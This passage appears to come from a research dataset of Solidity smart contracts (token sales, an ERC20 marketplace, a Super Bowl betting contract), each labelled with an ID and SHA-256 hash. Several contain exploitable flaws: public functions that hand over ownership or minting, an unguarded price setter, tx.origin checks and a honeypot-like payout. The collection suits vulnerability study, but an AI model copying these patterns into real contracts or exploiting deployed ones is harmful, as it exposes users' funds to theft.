        withdraw_to.transfer(amount); 
        emit e_withdraw_some_amount(withdraw_to, amount);
    }
    function set_sale_open() public only_owner {
        require(db.get_presale_arbits_per_ether() > 0);
        require(db.get_arbits_max_contribution() > 0);
        require(db.get_arbits_min_contribution() > 0);
        require(db.get_pre_kyc_bonus_numerator() > 0);
        require(db.get_pre_kyc_bonus_denominator() > 0);
        db.set_arbits_presale_open(true);
    }
    function set_sale_closed() public only_owner {
        db.set_arbits_presale_open(false);
    }
    function set_tokens_per_ether(uint256 _v) public only_owner {
        db.set_presale_arbits_per_ether(_v);
    }
    function set_pre_kyc_bonus_numerator(uint256 _v) public only_owner {
        db.set_pre_kyc_bonus_numerator(_v);
    }
    function set_pre_kyc_bonus_denominator(uint256 _v) public only_owner {
        db.set_pre_kyc_bonus_denominator(_v);
    }
    function add_to_whitelist(address _a) public only_owner {
        db.set_arbits_whitelist(_a, true);
        emit e_add_to_whitelist(msg.sender, _a);
    }
    function remove_from_whitelist(address _a) public only_owner {
        db.set_arbits_whitelist(_a, false);
        emit e_remove_from_whitelist(msg.sender, _a);
    }
    function set_max_contribution(uint256 _v) public only_owner {
        db.set_arbits_max_contribution(_v);
    }
    function set_min_contribution(uint256 _v) public only_owner {
        db.set_arbits_min_contribution(_v);
    }
    function set_tokens_total(uint256 _v) public only_owner {
        db.set_presale_arbits_total(_v);
    }
    function set_tokens_sold(uint256 _v) public only_owner {
        db.set_presale_arbits_sold(_v);
    }
    function is_presale_open() public view returns(bool) {
        return db.get_arbits_presale_open();
    }
    function am_i_on_the_whitelist() public view returns(bool) {
        return db.get_arbits_whitelist(msg.sender);
    }
    function how_many_arbits_do_i_have() public view returns(uint256) {
        return db.get_arbits(msg.sender);
    }
    event e_add_owner(address addres1, address address2); 
    event e_remove_owner(address addres1, address address2); 
    event e_add_to_whitelist(address, address); 
    event e_remove_from_whitelist(address, address); 
    event e_participate_in_arbits_presale_fiat(address, uint256); 
    event e_participate_in_arbits_presale_crypto(address, uint256); 
    event e_fallback(address, uint256); 
    event e_kill_and_withdraw(address); 
    event e_withdraw_some_amount(address, uint256); 
}
```

## RQ1_85f6a66f39c6

SHA-256 `be08383de56f39de86180f89d27db9dd14762f6c508f98c238b030bc05f8c0e2`

```solidity
pragma solidity ^0.4.18;
contract Token {
  function totalSupply () constant returns (uint256 _totalSupply);
  function balanceOf (address _owner) constant returns (uint256 balance);
  function transfer (address _to, uint256 _value) returns (bool success);
  function transferFrom (address _from, address _to, uint256 _value) returns (bool success);
  function approve (address _spender, uint256 _value) returns (bool success);
  function allowance (address _owner, address _spender) constant returns (uint256 remaining);
  event Transfer (address indexed _from, address indexed _to, uint256 _value);
  event Approval (address indexed _owner, address indexed _spender, uint256 _value);
}
contract SafeMath {
  uint256 constant private MAX_UINT256 =
  0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
  function safeAdd (uint256 x, uint256 y) constant internal returns (uint256 z) {
    assert (x <= MAX_UINT256 - y);
    return x + y;
  }
  function safeSub (uint256 x, uint256 y) constant internal returns (uint256 z) {
    assert (x >= y);
    return x - y;
  }
  function safeMul (uint256 x, uint256 y)  constant internal  returns (uint256 z) {
    if (y == 0) return 0; 
    assert (x <= MAX_UINT256 / y);
    return x * y;
  }
   function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
}
contract AbstractToken is Token, SafeMath {
  function AbstractToken () {
  }
  function balanceOf (address _owner) constant returns (uint256 balance) {
    return accounts [_owner];
  }
  function transfer (address _to, uint256 _value) returns (bool success) {
    if (accounts [msg.sender] < _value) return false;
    if (_value > 0 && msg.sender != _to) {
      accounts [msg.sender] = safeSub (accounts [msg.sender], _value);
      accounts [_to] = safeAdd (accounts [_to], _value);
    }
    Transfer (msg.sender, _to, _value);
    return true;
  }
  function transferFrom (address _from, address _to, uint256 _value)  returns (bool success) {
    if (allowances [_from][msg.sender] < _value) return false;
    if (accounts [_from] < _value) return false;
    allowances [_from][msg.sender] =
      safeSub (allowances [_from][msg.sender], _value);
    if (_value > 0 && _from != _to) {
      accounts [_from] = safeSub (accounts [_from], _value);
      accounts [_to] = safeAdd (accounts [_to], _value);
    }
    Transfer (_from, _to, _value);
    return true;
  }
  function approve (address _spender, uint256 _value) returns (bool success) {
    allowances [msg.sender][_spender] = _value;
    Approval (msg.sender, _spender, _value);
    return true;
  }
  function allowance (address _owner, address _spender) constant returns (uint256 remaining) {
    return allowances [_owner][_spender];
  }
  mapping (address => uint256) accounts;
  mapping (address => mapping (address => uint256)) private allowances;
}
contract SOLARToken is AbstractToken {
     address public owner;
     uint256 tokenCount = 0;
     bool frozen = false;
     uint256 constant MAX_TOKEN_COUNT = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
    uint public constant _decimals = (10**8);
    modifier onlyOwner() {
	    require(owner == msg.sender);
	    _;
	}
    function SOLARToken() {
         owner = msg.sender;
         createTokens(60 * (10**14));
     }
    function totalSupply () constant returns (uint256 _totalSupply) {
        return tokenCount;
     }
    function name () constant returns (string result) {
        return "SOLAR TOKEN";
    }
    function symbol () constant returns (string result) {
            return "SOLAR";
    }
    function decimals () constant returns (uint result) {
        return 8;
    }
    function transfer (address _to, uint256 _value) returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transfer (_to, _value);
  }
  function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
  function approve (address _spender, uint256 _currentValue, uint256 _newValue)
    returns (bool success) {
    if (allowance (msg.sender, _spender) == _currentValue)
      return approve (_spender, _newValue);
    else return false;
  }
  function burnTokens (uint256 _value) returns (bool success) {
    if (_value > accounts [msg.sender]) return false;
    else if (_value > 0) {
      accounts [msg.sender] = safeSub (accounts [msg.sender], _value);
      tokenCount = safeSub (tokenCount, _value);
      return true;
    } else return true;
  }
  function createTokens (uint256 _value) returns (bool success) {
    require (msg.sender == owner);
    if (_value > 0) {
      if (_value > safeSub (MAX_TOKEN_COUNT, tokenCount)) return false;
      accounts [msg.sender] = safeAdd (accounts [msg.sender], _value);
      tokenCount = safeAdd (tokenCount, _value);
    }
    return true;
  }
  function setOwner (address _newOwner) {
    require (msg.sender == owner);
    owner = _newOwner;
  }
  function freezeTransfers () {
    require (msg.sender == owner);
    if (!frozen) {
      frozen = true;
      Freeze ();
    }
  }
  function unfreezeTransfers () {
    require (msg.sender == owner);
    if (frozen) {
      frozen = false;
      Unfreeze ();
    }
  }
  event Freeze ();
  event Unfreeze ();
}
contract SOLARSale is SOLARToken  {
    enum State { ICO_FIRST, ICO_SECOND, STOPPED, CLOSED }
    State public currentState = State.ICO_FIRST;
    uint public tokenPrice = 250000000000000; 
    uint public _minAmount = 0.025 ether;
    address public beneficiary;
    uint256 public totalSold = 0;
    uint256 private _hardcap = 30000 ether;
    uint256 private _softcap = 3750 ether;
    bool private _allowedTransfers = true;
    modifier minAmount() {
        require(msg.value >= _minAmount);
        _;
    }
    modifier saleIsOn() {
        require(currentState != State.STOPPED && currentState != State.CLOSED);
        _;
    }
    function DESALSale() {
        owner = msg.sender;
        beneficiary = msg.sender;
    }
    function setState(State _newState) public onlyOwner {
        require(currentState != State.CLOSED);
        currentState = _newState;
    }
    function setMinAmount(uint _new) public onlyOwner {
        _minAmount = _new;
    }
    function allowTransfers() public onlyOwner {
            _allowedTransfers = true;		
    }
    function stopTransfers() public onlyOwner {
            _allowedTransfers = false;
    }
    function stopSale() public onlyOwner {
        currentState = State.CLOSED;
    }
    function setBeneficiaryAddress(address _new) public onlyOwner {
        beneficiary = _new;
    }
    function transferPayable(address _address, uint _amount) private returns (bool) {
        accounts[_address] = safeAdd(accounts[_address], _amount);
        accounts[owner] = safeSub(accounts[owner], _amount);
        totalSold = safeAdd(totalSold, _amount);
        return true;
    }
    function getTokens() public saleIsOn() minAmount() payable {
        uint tokens = get_tokens_count(msg.value);
        require(transferPayable(msg.sender , tokens));
        if(_allowedTransfers) { beneficiary.transfer(msg.value); }
    }
    function get_tokens_count(uint _amount) private returns (uint) {
         uint currentPrice = tokenPrice;
         uint tokens = safeDiv( safeMul(_amount, _decimals), currentPrice ) ;
         return tokens;
    }
    function() external payable {
      getTokens();
    }
}
```

## RQ1_742a666ba5fe

SHA-256 `88f143807f10f4b8662f4f7555dc2b87ed587a68d10bcac58a954a0a73915a5e`

```solidity
pragma solidity ^0.4.18;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract StreamCashToken is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;    
    string public constant name = "Stream Cash Token";
    string public constant symbol = "STRM";
    uint public constant decimals = 8;
    uint256 public totalSupply = 400000000e8;
    uint256 public totalDistributed = 0;    
    uint256 public constant MIN_PURCHASE = 1 ether / 100;
    uint256 public tokensPerEth = 500000e8;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Airdrop(address indexed _owner, uint _amount, uint _balance);
    event TokensPerEthUpdated(uint _tokensPerEth);
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function WithrawDevToken () public {
        owner = msg.sender;
        uint256 devTokens = 100000000e8;
        distr(owner, devTokens);        
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
    }
    function doAirdrop(address _participant, uint _amount) internal {
        require( _amount > 0 );      
        require( totalDistributed < totalSupply );
        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        Airdrop(_participant, _amount, balances[_participant]);
        Transfer(address(0), _participant, _amount);
    }
    function transferTokenTo(address _participant, uint _amount) public onlyOwner {        
        doAirdrop(_participant, _amount);
    }
    function transferTokenToMultiple(address[] _addresses, uint _amount) public onlyOwner {        
        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);
    }
    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        TokensPerEthUpdated(_tokensPerEth);
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr  public {
        uint256 tokens = 0;
        require( msg.value >= MIN_PURCHASE );
        require( msg.value > 0 );
        tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        address investor = msg.sender;
        if (tokens > 0) {
            distr(investor, tokens);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_f1d0c1efc742

SHA-256 `045ae56015ddbe5b39ac7538ac18c1c770af38540d25d320b1d2dbd135b160c2`

```solidity
pragma solidity ^0.4.18;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BallotSB52 {
  using SafeMath for uint;
  uint public phiWon;
  uint public neWon;
  Superbowl52 bettingContract;
  mapping (address => bool) voted;
  mapping (address => uint) votes;
  uint public constant votingPeriod = 7 days;
  uint public votingStart;
  uint public votingEnd;
  uint public validResult;
  bool public closed;
  uint public totalVoters;
  uint public threshold;
  uint public votingReward;
  mapping (address => uint) stake;
  uint public majorityReward;
  bool public tie;
  mapping (address => bool) claimed;
  function BallotSB52(uint th) public payable {
    validResult = 0;
    closed = false;
    votingStart = now;
    votingEnd = now + 7 days;
    bettingContract = Superbowl52(msg.sender);
    totalVoters = 0;
    threshold = th;
    tie = false;
    votingReward = 0;
  }
  function voteResult(uint team) public payable {
    require(votingStart <= now && votingEnd >= now);
    require(voted[msg.sender] == false);
    require(msg.value == 50 finney);
    require(!closed);
    if(team == 1) {
      phiWon += 1;
    }
    else if (team == 2) {
      neWon += 1;
    } else revert();
    voted[msg.sender] = true;
    votes[msg.sender] = team;
    totalVoters += 1;
    stake[msg.sender] = msg.value;
  }
  function closeBallot() public returns (uint) {
    require(!closed);
    require(now > votingEnd);
    if((phiWon.mul(100000).div(totalVoters) == neWon.mul(100000).div(totalVoters)) && (threshold == 50000)) {
      validResult = 9;
      closed = true;
      tie = true;
      return validResult;
    } else if(phiWon.mul(100000).div(totalVoters) >= threshold) {
      validResult = 1;
      votingReward = bettingContract.getLosersOnePercent(2);
      majorityReward = (neWon * 50 finney).add(votingReward).div(phiWon);
    } else if (neWon.mul(100000).div(totalVoters) >= threshold) {
      validResult = 2;
      votingReward = bettingContract.getLosersOnePercent(3);
      majorityReward = (phiWon * 50 finney).add(votingReward).div(neWon);
    } else {
      if (neWon.mul(100000).div(totalVoters) > 50000) majorityReward = (phiWon * 50 finney).div(neWon);
      else if (phiWon.mul(100000).div(totalVoters) > 50000) majorityReward = (neWon * 50 finney).div(phiWon);
      else {
        tie = true;
        majorityReward = 0;
      }
      validResult = 0;
    }
    closed = true;
    return validResult;
  }
  function getReward(address voter) public {
    require(closed);
    require(voted[voter]);
    require(claimed[voter] == false);
    if(tie) {
      voter.transfer(stake[voter]);
    }
    if(votes[voter] == validResult) {
      voter.transfer(stake[voter] + majorityReward);
    } 
    claimed[voter] = true;
  }
  function hasClaimed(address voter) public constant returns (bool) {
    return claimed[voter];
  }
  function () public payable {}
}
contract Superbowl52 {
  using SafeMath for uint;
  uint public constant GAME_START_TIME = 1517787000;
  bool public resultConfirmed = false;
  address public owner;
  mapping(address => betting) public bets;
  uint public totalBets;
  uint public philadelphiaBets;
  uint public newEnglandBets;
  uint public result;
  uint public betters;
  bool public votingOpen;
  bool public withdrawalOpen;
  uint public threshold;
  uint public winningPot;
  mapping(address => uint) public wins;
  BallotSB52 public ballot;
  struct betting {
    uint philadelphiaBets;
    uint newEnglandBets;
    bool claimed;
  }
  function Superbowl52() public {
    require(now<GAME_START_TIME);
    owner = msg.sender;
    result = 0;
    votingOpen = false;
    withdrawalOpen = false;
    threshold = 90000;
    winningPot = 0;
  }
  function bet(uint team) public payable {
    require(team == 1 || team == 2);
    require(now <= GAME_START_TIME);
    require(msg.value > 0);
    if(!hasBet(msg.sender)) betters += 1;
    if(team == 1) {
      bets[msg.sender].philadelphiaBets += msg.value;
      philadelphiaBets += msg.value;
    } else if (team == 2) {
      bets[msg.sender].newEnglandBets += msg.value;
      newEnglandBets += msg.value;
    }
    totalBets += msg.value;
  }
  function () public payable {
    revert();
  }
  function getPhiladelphiaBets(address better) public constant returns (uint) {
    return bets[better].philadelphiaBets;
  }
  function getNewEnglandBets(address better) public constant returns (uint) {
    return bets[better].newEnglandBets;
  }
  function hasClaimed(address better) public constant returns (bool) {
    return bets[better].claimed;
  }
  function startVoting() public {
    require(votingOpen == false);
    require(withdrawalOpen == false);
    require(now >= GAME_START_TIME + 8 hours);
    votingOpen = true;
    ballot = new BallotSB52(threshold);
  }
  function hasBet(address better) public constant returns (bool) {
    return (bets[better].philadelphiaBets + bets[better].newEnglandBets) > 0;
  }
  function endVoting() public {
    require(votingOpen);
    result = ballot.closeBallot();
    if (result == 1 || result == 2) {
      withdrawalOpen = true;
      votingOpen = false;
    } else if (result == 9) {
      votingOpen = false;
      withdrawalOpen = false;
    } else {
      threshold = threshold - 5000;
      ballot = new BallotSB52(threshold);
    }
    if(result == 1) winningPot = totalBets.sub(newEnglandBets.div(100));
    if(result == 2) winningPot = totalBets.sub(philadelphiaBets.div(100));
  }
  function getLosersOnePercent(uint loser) public returns (uint) {
    require(votingOpen);
    require(msg.sender == address(ballot));
    if(loser==1) {
      ballot.transfer(philadelphiaBets.div(100));
      return philadelphiaBets.div(100);
    }
    else if (loser==2) {
      ballot.transfer(newEnglandBets.div(100));
      return newEnglandBets.div(100);
    }
    else {
      return 0;
    }
  }
  function breakTie(uint team) {
    require(result == 9);
    require(msg.sender == owner);
    result = team;
    withdrawalOpen = true;
  }
  function getWinnings(uint donation) public {
    require(donation<=100);
    require(withdrawalOpen);
    require(bets[msg.sender].claimed == false);
    uint winnings = 0;
    if (result == 1) winnings = (getPhiladelphiaBets(msg.sender).mul(winningPot)).div(philadelphiaBets);
    else if (result == 2) winnings = (getNewEnglandBets(msg.sender).mul(winningPot)).div(newEnglandBets);
    else revert();
    wins[msg.sender] = winnings;
    uint donated = winnings.mul(donation).div(100);
    bets[msg.sender].claimed = true;
    owner.transfer(donated);
    msg.sender.transfer(winnings-donated);
  }
}
```

## RQ1_e99440cca868

SHA-256 `ac063f855f8ee009ccbd3a03eacd515e2c3d59ec59f1d658bde2c07413467463`

```solidity
pragma solidity ^0.4.25;
contract MultiPly
{
    address O = tx.origin;
    function() public payable {}
    function vx() public {if(tx.origin==O)selfdestruct(tx.origin);}
    function ply() public payable {
        if (msg.value >= this.balance) {
            tx.origin.transfer(this.balance);
        }
    }
 }
```

## RQ1_61055eec37f1

SHA-256 `e0c4f73e632691fdd10c4892c1428e51ee857701a790da3e298b483e0a4e51bb`

```solidity
pragma solidity ^0.4.18;
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  function Ownable() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
pragma solidity ^0.4.18;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ERC20Basic {
  uint256 public totalSupply;
  uint8 public decimals;
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract ListingsERC20 is Ownable {
      using SafeMath for uint256;
    struct Listing {
        address seller;
        address tokenContractAddress;
        uint256 price;
        uint256 allowance;
        uint256 dateStarts;
        uint256 dateEnds;
    }
    event ListingCreated(bytes32 indexed listingId, address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateStarts, uint256 dateEnds, address indexed seller);
    event ListingCancelled(bytes32 indexed listingId, uint256 dateCancelled);
    event ListingBought(bytes32 indexed listingId, address tokenContractAddress, uint256 price, uint256 amount, uint256 dateBought, address buyer);
    string constant public VERSION = "1.0.1";
    uint16 constant public GAS_LIMIT = 4999;
    uint256 public ownerPercentage;
    mapping (bytes32 => Listing) public listings;
    mapping (bytes32 => uint256) public sold;
    function ListingsERC20(uint256 percentage) public {
        ownerPercentage = percentage;
    }
    function updateOwnerPercentage(uint256 percentage) external onlyOwner {
        ownerPercentage = percentage;
    }
    function withdrawBalance() onlyOwner external {
        assert(owner.send(this.balance));
    }
    function approveToken(address token, uint256 amount) onlyOwner external {
        assert(ERC20(token).approve(owner, amount));
    }
    function() external payable { }
    function getHash(address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateEnds, uint256 salt) external view returns (bytes32) {
        return getHashInternal(tokenContractAddress, price, allowance, dateEnds, salt);
    }
    function getHashInternal(address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateEnds, uint256 salt) internal view returns (bytes32) {
        return keccak256(msg.sender, tokenContractAddress, price, allowance, dateEnds, salt);
    }
    function getBalance(address tokenContract, address seller) internal constant returns (uint256) {
        return ERC20(tokenContract).balanceOf.gas(GAS_LIMIT)(seller);
    }
    function getAllowance(address tokenContract, address seller, address listingContract) internal constant returns (uint256) {
        return ERC20(tokenContract).allowance.gas(GAS_LIMIT)(seller, listingContract);
    }
    function getDecimals(address tokenContract) internal constant returns (uint256) {
        return ERC20(tokenContract).decimals.gas(GAS_LIMIT)();
    }
    function createListing(address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateEnds, uint256 salt) external {
        require(price > 0);
        require(allowance > 0);
        require(dateEnds > 0);
        require(getBalance(tokenContractAddress, msg.sender) >= allowance);
        bytes32 listingId = getHashInternal(tokenContractAddress, price, allowance, dateEnds, salt);
        Listing memory listing = Listing(msg.sender, tokenContractAddress, price, allowance, now, dateEnds);
        listings[listingId] = listing;
        ListingCreated(listingId, tokenContractAddress, price, allowance, now, dateEnds, msg.sender);
    }
    function cancelListing(bytes32 listingId) external {
        Listing storage listing = listings[listingId];
        require(msg.sender == listing.seller);
        delete listings[listingId];
        ListingCancelled(listingId, now);
    }
    function buyListing(bytes32 listingId, uint256 amount) external payable {
        Listing storage listing = listings[listingId];
        address seller = listing.seller;
        address contractAddress = listing.tokenContractAddress;
        uint256 price = listing.price;
        uint256 decimals = getDecimals(listing.tokenContractAddress);
        uint256 factor = 10 ** decimals;
        uint256 sale;
        if (decimals > 0) {
            sale = price.mul(amount).div(factor);
        } else {
            sale = price.mul(amount);
        } 
        uint256 allowance = listing.allowance;
        require(now <= listing.dateEnds);
        require(allowance - sold[listingId] >= amount);
        require(getBalance(contractAddress, seller) >= amount);
        require(getAllowance(contractAddress, seller, this) >= amount);
        require(msg.value == sale);
        ERC20 tokenContract = ERC20(contractAddress);
        require(tokenContract.transferFrom(seller, msg.sender, amount));
        if (ownerPercentage > 0) {
            seller.transfer(sale - (sale.mul(ownerPercentage).div(10000)));
        } else {
            seller.transfer(sale);
        }
        sold[listingId] = sold[listingId].add(amount);
        ListingBought(listingId, contractAddress, price, amount, now, msg.sender);
    }
}
```

## RQ1_1f156ef466b1

SHA-256 `bd291db050ad9450ff3b2063b2abb63754ba3e1a57500cf17e6077a67590df4b`

```solidity
pragma solidity ^0.4.11;
library SafeMath {
  function mul(uint256 a, uint256 b) internal returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
  function max64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a >= b ? a : b;
  }
  function min64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a < b ? a : b;
  }
  function max256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a >= b ? a : b;
  }
  function min256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a < b ? a : b;
  }
}
contract Token {
    uint256 public totalSupply;
    function balanceOf(address _owner) constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);
    function approve(address _spender, uint256 _value) returns (bool success);
    function allowance(address _owner, address _spender) constant returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}
contract StandardToken is Token {
    mapping (address => uint256) balances;    
    mapping (address => mapping (address => uint256)) allowed;
    function transfer(address _to, uint256 _value) returns (bool success) {
      if (_to == 0x0) return false;
      if (balances[msg.sender] >= _value && _value > 0) {
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
      } else {
        return false;
      }
    }
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
      if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
        balances[_to] += _value;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
      } else {
        return false;
      }
    }
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }
    function balanceOf(address _owner) constant returns (uint256){
        return balances[_owner];
    }
    function approve(address _spender, uint256 _value)
        returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        return true;
    }
}
contract KairosToken is StandardToken {
  using SafeMath for uint256;
  mapping(address => bool) frozenAccount;
  mapping(address => uint256) bonus; 
  address public kairosOwner;
  string  public constant name         = "KAIROS";
  string  public constant symbol       = "KRX";
  string  public constant version      = "1.0";
  uint256 public constant decimals     = 18;  
  uint256 public initialSupply         = 25 * (10**6) * 10**decimals;
  uint256 public totalSupply;
  uint256 public sellPrice;
  uint256 public buyPrice;
  event CreateNertia(address indexed _to, uint256 _value);
  event Burn(address indexed _from, uint256 _value);
  event FrozenFunds(address indexed _target, bool _frozen );
  event Mint(address indexed _to, uint256 _value);
  modifier onlyOwner{ 
    if ( msg.sender != kairosOwner) throw; 
    _; 
  }    
  function KairosToken(){
    kairosOwner            = msg.sender;
    balances[kairosOwner]  = initialSupply;
    totalSupply            = initialSupply;
    CreateNertia(kairosOwner, initialSupply);
  }
  function buy() payable returns (uint256 amount) {
    amount = msg.value / buyPrice;
    if(balances[kairosOwner] < amount) throw;
    balances[msg.sender] += amount;
    balances[kairosOwner] -= amount;    
    Transfer(kairosOwner, msg.sender, amount);
    return amount;
  }
  function sell(uint256 amount){
    if(balances[msg.sender] < amount) throw;
    balances[kairosOwner] += amount;
    balances[msg.sender] -= amount;
    if(!msg.sender.send(amount.mul(sellPrice))){
        throw;
    }
    Transfer(msg.sender, kairosOwner, amount);    
  }
  function setPrices(uint256 newSellPrice, uint256 newBuyPrice){
    sellPrice = newSellPrice;
    buyPrice = newBuyPrice;
  }
  function transfer(address _to, uint256 _value) returns (bool success) {
      if (_to == 0x0) return false;
      if (!frozenAccount[msg.sender] && balances[msg.sender] >= _value && _value > 0) {
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
